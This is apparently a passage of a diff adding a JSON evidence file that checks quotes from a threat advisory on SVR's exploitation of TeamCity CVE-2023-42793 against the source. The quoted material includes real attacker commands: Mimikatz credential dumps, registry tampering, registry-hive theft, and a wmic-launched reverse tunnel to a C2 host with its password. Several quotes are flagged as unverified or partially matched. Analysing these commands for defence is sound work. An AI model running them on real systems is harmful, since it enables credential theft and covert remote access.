+   "quote": "To avoid detection, the SVR used a “Bring Your Own Vulnerable Driver” technique to disable or outright kill endpoint detection and response (EDR) and antivirus (AV) software. This was done using an open source project called “EDRSandBlast.” The authoring agencies have observed the SVR using EDRSandBlast to remove protected process light (PPL) protection ... The actors then inject code into AV/EDR processes for a small subset of victims.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 1.0,
+   "matched_text": "To avoid detection, the SVR used a “Bring Your Own Vulnerable Driver” technique to disable or outright kill endpoint detection and response (EDR) and antivirus "
+  },
+  {
+   "id": "evidence-7",
+   "quote": "In several cases SVR attempted to hide their backdoors via: Abusing a DLL hijacking vulnerability in Zabbix software by replacing a legitimate Zabbix DLL with their one containing GraphicalProton backdoor, Backdooring an open source application developed by Microsoft named vcperf ... Abusing a DLL hijacking vulnerability in Webroot antivirus software by replacing a legitimate DLL with one containing GraphicalProton backdoor.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 0.9767,
+   "matched_text": " software by replacing a legitimate Zabbix DLL with their one containing GraphicalProton backdoor, "
+  },
+  {
+   "id": "evidence-8",
+   "quote": "To avoid detection by network monitoring, the SVR devised a covert C2 channel that used Microsoft OneDrive and Dropbox cloud services. To further enable obfuscation, data exchanged with malware via OneDrive and Dropbox were hidden inside randomly generated BMP files.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "15"
+   },
+   "quote_verified": true,
+   "quote_match": "strong",
+   "match_score": 0.9963,
+   "matched_text": "To avoid detection by network monitoring, the SVR devised a covert C2 channel that used Microsoft OneDrive and Dropbox cloud services. To further enable obfusca"
+  },
+  {
+   "id": "evidence-9",
+   "quote": "To facilitate privilege escalation, the SVR used multiple techniques, including WinPEAS, NoLmHash registry key modification, and the Mimikatz tool. The SVR modified the NoLMHash registry using the following reg command: reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v NoLmHash /t REG_DWORD /d \"0\" /f",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "17"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 1.0,
+   "matched_text": " NoLmHash registry key modification, and the Mimikatz tool. The SVR modified the NoLMHash registry using the following reg command: "
+  },
+  {
+   "id": "evidence-10",
+   "quote": "The SVR used the following Mimikatz commands: privilege::debug, lsadump::cache, lsadump::secrets, lsadump::sam, sekurlsa::logonpasswords",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "18"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 1.0,
+   "matched_text": "The SVR used the following Mimikatz commands: "
+  },
+  {
+   "id": "evidence-11",
+   "quote": "The SVR relied on scheduled tasks to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories: C:\\Windows\\temp, C:\\Windows\\System32, C:\\Windows\\WinStore. The SVR made all modifications using the schtasks.exe binary.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "19"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 0.7879,
+   "matched_text": "The SVR relied on scheduled tasks to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of "
+  },
+  {
+   "id": "evidence-12",
+   "quote": "To secure long-term access to the environment, the SVR used the Rubeusl toolkit to craft Ticket Granting Tickets (TGTs).",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "20"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "To secure long term access to the environment, the SVR used the Rubeusl toolkit to craft Ticket Granting Tickets (TGTs)."
+  },
+  {
+   "id": "evidence-13",
+   "quote": "The SVR exfiltrated the following Windows Registry hives from its victims: HKLM\\SYSTEM, HKLM\\SAM, HKLM\\SECURITY. In order to exfiltrate Windows Registry, the SVR saved hives into files, packed them, and then exfiltrated them using a backdoor capability. it used “reg save” to save SYSTEM, SAM and SECURITY registry hives, and used powershell to stage .zip archives in the C:\\Windows\\Temp\\ directory.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "22"
+   },
+   "quote_verified": false,
+   "quote_match": "none",
+   "match_score": 0.0,
+   "matched_text": "The SVR exfiltrated the following Windows Registry hives from its victims: "
+  },
+  {
+   "id": "evidence-14",
+   "quote": "In a few specific cases, the SVR used the SharpChromiumm tool to obtain sensitive browser data such as session cookies, browsing history, or saved logins.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "24"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "In a few specific cases, the SVR used the SharpChromiumm tool to obtain sensitive browser data such as session cookies, browsing history, or saved logins."
+  },
+  {
+   "id": "evidence-15",
+   "quote": "The SVR performed network reconnaissance using a mix of built-in commands and additional tools, such as port scanner and PowerSploit, which it launched into memory. The SVR executed the following PowerSploit commands: Get-NetComputer, Get-NetGroup, Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount, Get-NetDiDomain, Get-AdUser, Get-DomainUser -UserName, Get-NetUser -PreauthNotRequire",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "25"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 1.0,
+   "matched_text": "The SVR performed network reconnaissance using a mix of built in commands and additional tools, such as port scanner and PowerSploit,"
+  },
+  {
+   "id": "evidence-16",
+   "quote": "In selected environments the SVR used an additional tool named, “rr.exe”—a modified open source reverse socks tunneler named Rsockstunp—to establish a tunnel to the C2 infrastructure.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "27"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "In selected environments the SVR used an additional tool named, “rr.exe” a modified open source reverse socks tunneler named Rsockstunp to establish a tunnel to"
+  },
+  {
+   "id": "evidence-17",
+   "quote": "The SVR executed Rsockstun either in memory or using the Windows Management Instrumentation Command Line (WMIC) utility after dropping it to disk: wmic process call create \"C:\\Program Files\\Windows Defender Advanced Threat Protection\\Sense.exe -connect poetpages.com -pass M554-0sddsf2@34232fsl45t31\"",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "28"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 1.0,
+   "matched_text": " wmic process call create \"C:\\Program Files\\Windows Defender Advanced Threat Protection\\Sense.exe connect poetpages.com pass M554 0sddsf2@34232fsl45t31\""
+  },
+  {
+   "id": "evidence-18",
+   "quote": "The SVR used WMIC to facilitate lateral movement,. wmic /node:\"\"<redacted>\"\" /user:\"\"<redacted>\" /password:\"\"<redacted>\"\" process call create \"\"rundll32 C:\\Windows\\system32\\AclNumsInvertHost.dll AclNumsInvertHost\"\"",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "29"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 1.0,
+   "matched_text": " wmic /node:\"\"<redacted>\"\" /user:\"\"<redacted>\" /password:\"\"<redacted>\"\" process call create \"\"rundll32 C:\\Windows\\system32\\AclNumsInvertHost.dll AclNumsInvertHo"
+  },
+  {
+   "id": "evidence-19",
+   "quote": "The SVR also modified DisableRestrictedAdmin key to enable remote connections. It modified Registry using the following reg command: reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d \"0\" /f",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "30"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 1.0,
+   "matched_text": "The SVR also modified DisableRestrictedAdmin key to enable remote connections. It modified Registry using the following reg command: "
+  },
+  {
+   "id": "evidence-20",
+   "quote": "GraphicalProton– is a simplistic backdoor that uses OneDrive, Dropbox, and randomly generated BMPs to exchange data with the SVR operator. After execution, GraphicalProton gathers environment information such as active TCP/UDP connections, running processes, as well as user, host, and domain names. OneDrive is used as a primary communication channel while Dropbox is treated as a backup channel. API keys are hardcoded into the malware. When communicating with cloud services, GraphicalProton generates a randomly named directory which is used to store infection-specific BMP files - with both commands and results. Directory name is re-randomized each time the GraphicalProton process is started.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "31"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 1.0,
+   "matched_text": " After execution, GraphicalProton gathers environment information such as active TCP/UDP connections, running processes, as well as user, host, and domain names"
+  },
+  {
+   "id": "evidence-21",
+   "quote": "GraphicalProton HTTPS variant – a variant of GraphicalProton backdoor recently introduced by the SVR that forgoes using cloud-based services as a C2 channel and instead relies on HTTP request. To legitimize the C2 channel, SVR used a re-registered expired domain set up with dummy WordPress website. Execution of HTTPS variant of GraphicalProton is split into two files – stager and encrypted binary file that contains further code.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "32"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "GraphicalProton HTTPS variant a variant of GraphicalProton backdoor recently introduced by the SVR that forgoes using cloud based services as a C2 channel and i"
+  },
+  {
+   "id": "evidence-22",
+   "quote": "The TeamCity exploitation usually resulted in code execution with high privileges granting the SVR an advantageous foothold in the network environment.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "unresolved:empty"
+   },
+   "quote_verified": false,
+   "quote_match": "none",
+   "match_score": 0.0,
+   "matched_text": ""
+  },
+  {
+   "id": "evidence-23",
+   "quote": "Initial observations show the SVR used the following basic, built-in commands to perform host reconnaissance,,: whoami /priv, whoami /all, whoami /groups, whoami /domain, nltest -dclist, nltest -dsgetdc, tasklist, netstat, wmic ...",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "unresolved:empty"
+   },
+   "quote_verified": false,
+   "quote_match": "none",
+   "match_score": 0.0,
+   "matched_text": ""
+  },
+  {
+   "id": "evidence-24",
+   "quote": "After the SVR built a secure foothold and gained an awareness of a victim’s TeamCity server, it then focused on network reconnaissance. The SVR performed network reconnaissance using a mix of built-in commands and additional tools, such as port scanner and PowerSploit,o which it launched into memory.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "25"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "After the SVR built a secure foothold and gained an awareness of a victim’s TeamCity server, it then focused on network reconnaissance. The SVR performed networ"
+  },
+  {
+   "id": "evidence-25",
+   "quote": "To avoid detection, the SVR used a “Bring Your Own Vulnerable Driver” technique to disable or outright kill endpoint detection and response (EDR) and antivirus (AV) software.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "To avoid detection, the SVR used a “Bring Your Own Vulnerable Driver” technique to disable or outright kill endpoint detection and response (EDR) and antivirus "
+  },
+  {
+   "id": "evidence-26",
+   "quote": "In several cases SVR attempted to hide their backdoors via: Abusing a DLL hijacking vulnerability in Zabbix software by replacing a legitimate Zabbix DLL with their one containing GraphicalProton backdoor, Backdooring an open source application developed by Microsoft named vcperf ... Abusing a DLL hijacking vulnerability in Webroot antivirus software by replacing a legitimate DLL with one containing GraphicalProton backdoor.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "unresolved:empty"
+   },
+   "quote_verified": false,
+   "quote_match": "none",
+   "match_score": 0.0,
+   "matched_text": ""
+  },
+  {
+   "id": "evidence-27",
+   "quote": "GraphicalProton– is a simplistic backdoor that uses OneDrive, Dropbox, and randomly generated BMPs to exchange data with the SVR operator.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "unresolved:empty"
+   },
+   "quote_verified": false,
+   "quote_match": "none",
+   "match_score": 0.0,
+   "matched_text": ""
+  },
+  {
+   "id": "evidence-28",
+   "quote": "To avoid detection by network monitoring, the SVR devised a covert C2 channel that used Microsoft OneDrive and Dropbox cloud services.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "15"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "To avoid detection by network monitoring, the SVR devised a covert C2 channel that used Microsoft OneDrive and Dropbox cloud services."
+  },
+  {
+   "id": "evidence-29",
+   "quote": "To facilitate privilege escalation, the SVR used multiple techniques, including WinPEAS, NoLmHash registry key modification, and the Mimikatz tool.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "unresolved:empty"
+   },
+   "quote_verified": false,
+   "quote_match": "none",
+   "match_score": 0.0,
+   "matched_text": ""
+  },
+  {
+   "id": "evidence-30",
+   "quote": "The SVR relied on scheduled tasks to secure persistent execution of backdoors.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "19"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "The SVR relied on scheduled tasks to secure persistent execution of backdoors."
+  },
+  {
+   "id": "evidence-31",
+   "quote": "Additionally, the authoring agencies have observed the SVR exfiltrating files which may provide insight into the host system’s operating system",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "Additionally, the authoring agencies have observed the SVR exfiltrating files which may provide insight into the host system’s operating system"
+  },
+  {
+   "id": "evidence-32",
+   "quote": "The SVR exfiltrated the following Windows Registry hives from its victims: HKLM\\SYSTEM, HKLM\\SAM, HKLM\\SECURITY. In order to exfiltrate Windows Registry, the SVR saved hives into files, packed them, and then exfiltrated them using a backdoor capability.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "unresolved:empty"
+   },
+   "quote_verified": false,
+   "quote_match": "none",
+   "match_score": 0.0,
+   "matched_text": ""
+  },
+  {
+   "id": "evidence-33",
+   "quote": "The SVR used WMIC to facilitate lateral movement,.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "29"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "The SVR used WMIC to facilitate lateral movement,."
+  },
+  {
+   "id": "evidence-34",
+   "quote": "The SVR executed Rsockstun either in memory or using the Windows Management Instrumentation Command Line (WMIC) utility after dropping it to disk",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "28"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "The SVR executed Rsockstun either in memory or using the Windows Management Instrumentation Command Line (WMIC) utility after dropping it to disk"
+  },
+  {
+   "id": "evidence-35",
+   "quote": "GraphicalProton HTTPS variant – a variant of GraphicalProton backdoor recently introduced by the SVR that forgoes using cloud-based services as a C2 channel and instead relies on HTTP request.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "32"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "GraphicalProton HTTPS variant a variant of GraphicalProton backdoor recently introduced by the SVR that forgoes using cloud based services as a C2 channel and i"
+  },
+  {
+   "id": "evidence-36",
+   "quote": "The SVR started to exploit Internet-connected JetBrains TeamCity servers in late September 2023 using CVE-2023-42793",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "9"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "The SVR started to exploit Internet connected JetBrains TeamCity servers in late September 2023 using CVE 2023 42793"
+  },
+  {
+   "id": "evidence-37",
+   "quote": "The TeamCity exploitation usually resulted in code execution with high privileges granting the SVR an advantageous foothold in the network environment.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "9"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 1.0,
+   "matched_text": "he TeamCity exploitation usually resulted in code execution with high privileges granting the SVR an advantageous foothold in the network environment."
+  },
+  {
+   "id": "evidence-38",
+   "quote": "On a Windows system, the log file C:\\TeamCity\\logs\\teamcity-server.log will contain a log message when an attacker modified the internal.properties file.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "119"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "On a Windows system, the log file C:\\TeamCity\\logs\\teamcity server.log will contain a log message when an attacker modified the internal.properties file."
+  },
+  {
+   "id": "evidence-39",
+   "quote": "The SVR exfiltrated files such as ntoskrnl.exe, SQL Server executable files, Visual Studio files, and update management agent files",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 0.9375,
+   "matched_text": " SQL Server executable files"
+  },
+  {
+   "id": "evidence-40",
+   "quote": "SVR abused DLL hijacking vulnerabilities in Zabbix ... by replacing a legitimate Zabbix DLL with their one containing GraphicalProton backdoor",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 0.8571,
+   "matched_text": " by replacing a legitimate Zabbix DLL with their one containing GraphicalProton backdoor"
+  },
+  {
+   "id": "evidence-41",
+   "quote": "Abusing a DLL hijacking vulnerability in Webroot antivirus software by replacing a legitimate DLL with one containing GraphicalProton backdoor",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 0.9286,
+   "matched_text": " antivirus software by replacing a legitimate DLL with one containing GraphicalProton backdoor"
+  },
+  {
+   "id": "evidence-42",
+   "quote": "Backdoored an open source application developed by Microsoft named vcperf ... After execution, backdoored vcperf dropped several DLLs to disc, one of those being a GraphicalProton backdoor",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 1.0,
+   "matched_text": ". After execution, backdoored vcperf dropped several DLLs to disc, one of those being a GraphicalProton backdoor"
+  },
+  {
+   "id": "evidence-43",
+   "quote": "The SVR exfiltrated files such as ... SQL Server executable files ... powershell Compress-Archive -Path \"C:\\Program Files\\Microsoft SQL Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqlmin.dll\" ...",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 0.7826,
+   "matched_text": "C:\\Program Files\\Microsoft SQL Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqlmin.dll"
+  },
+  {
+   "id": "evidence-44",
+   "quote": "The SVR used an open source project called EDRSandBlast to remove protected process light (PPL) protection and inject code into AV/EDR processes to evade detection.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 0.95,
+   "matched_text": " EDRSandBlast to remove protected process light (PPL) protection"
+  },
+  {
+   "id": "evidence-45",
+   "quote": "The SVR used the GraphicalProton backdoor, which uses OneDrive, Dropbox, and randomly generated BMP files to exchange data with the SVR operator.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "31"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 1.0,
+   "matched_text": " uses OneDrive, Dropbox, and randomly generated BMP"
+  },
+  {
+   "id": "evidence-46",
+   "quote": "Backdooring an open source application developed by Microsoft named vcperf ... After execution, backdoored vcperf dropped several DLLs to disc, one of those being a GraphicalProton backdoor",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "strong",
+   "match_score": 1.0,
+   "matched_text": "Backdooring an open source application developed by Microsoft named vcperf … After execution, backdoored vcperf dropped several DLLs to disc, one of those being"
+  },
+  {
+   "id": "evidence-47",
+   "quote": "To secure long-term access to the environment, the SVR used the Rubeus toolkit to craft Ticket Granting Tickets (TGTs).",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "20"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 0.9286,
+   "matched_text": "To secure long term access to the environment, the SVR used the Rubeus"
+  },
+  {
+   "id": "evidence-48",
+   "quote": "In a few specific cases, the SVR used the SharpChromium tool to obtain sensitive browser data such as session cookies, browsing history, or saved logins.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "24"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 0.9412,
+   "matched_text": "m tool to obtain sensitive browser data such as session cookies, browsing history, or saved logins."
+  },
+  {
+   "id": "evidence-49",
+   "quote": "The SVR used a modified open source reverse socks tunneler named Rsockstunp (rr.exe) to establish a tunnel to the C2 infrastructure, executed either in memory or using WMIC.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "27"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 0.7619,
+   "matched_text": " a modified open source reverse socks tunneler named Rsockstunp "
+  },
+  {
+   "id": "evidence-50",
+   "quote": "The SVR used ... executing Mimikatz commands.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "18"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 0.8,
+   "matched_text": "ing Mimikatz commands"
+  },
+  {
+   "id": "evidence-51",
+   "quote": "The SVR relied on scheduled tasks to secure persistent execution of backdoors, storing executables in various Windows directories and using schtasks.exe to create tasks.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "19"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 0.6667,
+   "matched_text": "The SVR relied on scheduled tasks to secure persistent execution of backdoors"
+  },
+  {
+   "id": "evidence-52",
+   "quote": "CVE-2023-42793",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "4"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2023 42793"
+  },
+  {
+   "id": "evidence-53",
+   "quote": "CVE-2023-42793",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "7"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2023 42793"
+  },
+  {
+   "id": "evidence-54",
+   "quote": "CVE-2023-42793",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "9"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2023 42793"
+  },
+  {
+   "id": "evidence-55",
+   "quote": "CVE-2023-42793",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "40"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2023 42793"
+  },
+  {
+   "id": "evidence-56",
+   "quote": "CVE-2023-42793",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "113"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2023 42793"
+  },
+  {
+   "id": "evidence-57",
+   "quote": "CVE-2023-42793",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "119"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2023 42793"
+  },
+  {
+   "id": "evidence-58",
+   "quote": "MSSQL14.MSSQLSERVER",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "MSSQL14.MSSQLSERVER"
+  },
+  {
+   "id": "evidence-59",
+   "quote": "MSSQL14.MSSQLSERVER",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "13"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "MSSQL14.MSSQLSERVER"
+  },
+  {
+   "id": "evidence-60",
+   "quote": "internal.properties",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "119"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "internal.properties"
+  },
+  {
+   "id": "evidence-61",
+   "quote": "01B5F7094DE0B2C6F8E28AA9A2DED678C166D615530E595621E692A9C0240732",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "122"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "01B5F7094DE0B2C6F8E28AA9A2DED678C166D615530E595621E692A9C0240732"
+  },
+  {
+   "id": "evidence-62",
+   "quote": "34C8F155601A3948DDB0D60B582CFE87DE970D443CC0E05DF48B1A1AD2E42B5E",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "122"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "34C8F155601A3948DDB0D60B582CFE87DE970D443CC0E05DF48B1A1AD2E42B5E"
+  },
+  {
+   "id": "evidence-63",
+   "quote": "620D2BF14FE345EEF618FDD1DAC242B3A0BB65CCB75699FE00F7C671F2C1D869",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "122"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "620D2BF14FE345EEF618FDD1DAC242B3A0BB65CCB75699FE00F7C671F2C1D869"
+  },
+  {
+   "id": "evidence-64",
+   "quote": "773F0102720AF2957859D6930CD09693824D87DB705B3303CEF9EE794375CE13",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "122"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "773F0102720AF2957859D6930CD09693824D87DB705B3303CEF9EE794375CE13"
+  },
+  {
+   "id": "evidence-65",
+   "quote": "7B666B978DBBE7C032CEF19A90993E8E4922B743EE839632BFA6D99314EA6C53",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "122"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "7B666B978DBBE7C032CEF19A90993E8E4922B743EE839632BFA6D99314EA6C53"
+  },
+  {
+   "id": "evidence-66",
+   "quote": "8AFB71B7CE511B0BCE642F46D6FC5DD79FAD86A58223061B684313966EFEF9C7",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "122"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "8AFB71B7CE511B0BCE642F46D6FC5DD79FAD86A58223061B684313966EFEF9C7"
+  },
+  {
+   "id": "evidence-67",
+   "quote": "971F0CED6C42DD2B6E3EA3E6C54D0081CF9B06E79A38C2EDE3A2C5228C27A6DC",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "122"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "971F0CED6C42DD2B6E3EA3E6C54D0081CF9B06E79A38C2EDE3A2C5228C27A6DC"
+  },
+  {
+   "id": "evidence-68",
+   "quote": "CB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "122"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF"
+  },
+  {
+   "id": "evidence-69",
+   "quote": "CB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "128"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF"
+  },
+  {
+   "id": "evidence-70",
+   "quote": "CD3584D61C2724F927553770924149BB51811742A461146B15B34A26C92CAD43",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "122"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CD3584D61C2724F927553770924149BB51811742A461146B15B34A26C92CAD43"
+  },
+  {
+   "id": "evidence-71",
+   "quote": "EBE231C90FAD02590FC56D5840ACC63B90312B0E2FEE7DA3C7606027ED92600E",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "122"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "EBE231C90FAD02590FC56D5840ACC63B90312B0E2FEE7DA3C7606027ED92600E"
+  },
+  {
+   "id": "evidence-72",
+   "quote": "F1B40E6E5A7CBC22F7A0BD34607B13E7E3493B8AAD7431C47F1366F0256E23EB",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "122"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "F1B40E6E5A7CBC22F7A0BD34607B13E7E3493B8AAD7431C47F1366F0256E23EB"
+  },
+  {
+   "id": "evidence-73",
+   "quote": "C7B01242D2E15C3DA0F45B8ADEC4E6913E534849CDE16A2A6C480045E03FBEE4",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "122"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "C7B01242D2E15C3DA0F45B8ADEC4E6913E534849CDE16A2A6C480045E03FBEE4"
+  },
+  {
+   "id": "evidence-74",
+   "quote": "4BF1915785D7C6E0987EB9C15857F7AC67DC365177A1707B14822131D43A6166",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "122"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "4BF1915785D7C6E0987EB9C15857F7AC67DC365177A1707B14822131D43A6166"
+  },
+  {
+   "id": "evidence-75",
+   "quote": "18101518EAE3EEC6EBE453DE4C4C380160774D7C3ED5C79E1813013AC1BB0B93",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "123"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "18101518EAE3EEC6EBE453DE4C4C380160774D7C3ED5C79E1813013AC1BB0B93"
+  },
+  {
+   "id": "evidence-76",
